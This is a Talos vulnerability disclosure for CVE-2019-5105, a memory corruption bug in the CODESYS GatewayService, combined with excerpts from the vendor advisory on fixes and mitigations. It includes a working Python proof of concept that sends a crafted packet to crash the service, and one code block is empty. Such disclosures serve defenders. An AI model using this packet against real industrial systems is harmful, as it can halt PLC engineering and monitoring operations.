# Talos Vulnerability Report

### TALOS-2019-0897

## 3S-Smart Software Solutions CODESYS GatewayService memory corruption vulnerability

##### March 25, 2020

##### CVE Number

CVE-2019-5105

### Summary

An exploitable memory corruption vulnerability exists in the Name Service Client functionality of 3S-Smart Software Solutions CODESYS GatewayService. A specially crafted packet can cause a large memcpy, resulting in an access violation and termination of the process. An attacker can send a packet to a device running the GatewayService.exe to trigger this vulnerability. All variants of the CODESYS V3 products in all versions prior V3.5.16.10 containing the CmpRouter or CmpRouterEmbedded component are affected, regardless of the CPU type or operating system: CODESYS Control for BeagleBone, CODESYS Control for emPC-A/iMX6, CODESYS Control for IOT2000, CODESYS Control for Linux, CODESYS Control for PLCnext, CODESYS Control for PFC100, CODESYS Control for PFC200, CODESYS Control for Raspberry Pi, CODESYS Control RTE V3, CODESYS Control RTE V3 (for Beckhoff CX), CODESYS Control Win V3 (also part of the CODESYS Development System setup), CODESYS Control V3 Runtime System Toolkit, CODESYS V3 Embedded Target Visu Toolkit, CODESYS V3 Remote Target Visu Toolkit, CODESYS V3 Safety SIL2, CODESYS Edge Gateway V3, CODESYS Gateway V3, CODESYS HMI V3, CODESYS OPC Server V3, CODESYS PLCHandler SDK, CODESYS V3 Simulation Runtime (part of the CODESYS Development System).

### Tested Versions

3S-Smart Software Solutions CODESYS 3.5.15.0

### Product URLs

<https://www.codesys.com>

### CVSSv3 Score

7.5 - CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H

### CWE

CWE-119: Improper Restriction of Operations within the Bounds of a Memory Buffer

### Details

3S-Smart Software Solutions CODESYS is licensed to vendors who are creating PLCs, or can be purchased directly from 3S-Smart Software Solutions for directly supported platforms. This software is used to turn any device into a soft PLC. The wide range of support allows easy adoption for industrial applications, being able to run on Windows, Linux, or even bare metal. The GatewayService.exe is required to be able to talk to the end device such as a PLC, and will be running on any Windows device that is being used to program or monitor a CODESYS runtime.

This bug manifests itself within `RouterHandleData`, starting with the `RouterGetBlkAddresses` function. This function extracts values from the received packet from the lowest 3 bits of byte 1, as well as the nibbles in byte 5. These offsets are calculated with a zero-indexed notation where 0xC5 is considered byte 0. These values are not verified to be less than the total length of the packet, and because they are not checked prior to usage within the `memcpy` it allows for the possibility of a integer underflow directly into the `size` parameter of `memcpy`.

```

```
### Exploit Proof of Concept

Ensure that the target host and port are correctly filled out. Additionally if testing remotely, ensure that a firewall is not blocking traffic to the port specified. This can be exploited remotely as well as locally. All bytes that are capitalized within the packet are unrelated to the crash.

```
import socket
from struct import pack

HOST = '192.168.1.10'
PORT = 11743

def main():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((HOST, PORT))

    crash = bytearray.fromhex("000117e839000000c5b3AAAAAAbcAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA")

    s.sendall(crash)

    s.close()

if __name__ == "__main__":
    main()

```

Advisory 2020-02

3.2  Exploitability

This vulnerability could be exploited remotely.

3.3  Difficulty

An attacker with low skills would be able to exploit this vulnerability.

3.4  Existence of exploit

POC is publicly available.

4  Available software updates

CODESYS GmbH has released version V3.5.16.10 to solve the noted vulnerability issue for all affected
CODESYS products.

Please visit the CODESYS update area for more information on how to obtain the software update [3].

It turned out that the previous fix in version V3.5.15.40 was incomplete. Therefore, we recommend an update to
V3.5.16.10 to close the vulnerability, regardless of the version used so far.

5  Mitigation

CODESYS GmbH recommends using the available software update to fix the vulnerability.

Currently, CODESYS GmbH has not identified any specific workarounds for this vulnerability, in case the
software update is not applied.

As part of a security strategy, CODESYS GmbH recommends the following general defense measures to
reduce the risk of exploits:
â€¢ Use controllers and devices only in a protected environment to minimize network exposure and ensure that
they are not accessible from outside
â€¢ Use firewalls to protect and separate the control system network from other networks
â€¢ Use VPN (Virtual Private Networks) tunnels if remote access is required
â€¢ Activate and apply user management and password features
â€¢ Limit the access to both development and control system by physical means, operating system features, etc.
â€¢ Protect both development and control system by using up to date virus detecting solutions
For more information and general recommendations for protecting machines and plants, see also the
CODESYS Security Whitepaper [1].

6  Acknowledgments

CODESYS GmbH thanks those in the security community, who help us to improve our products and to protect
customers and users through coordinated vulnerability disclosure.

We thank Carl Hurd of Cisco Talos, Gao Jian of NSFOCUS and an OEM customer for reporting this vulnerability
independently of each other following coordinated disclosure.
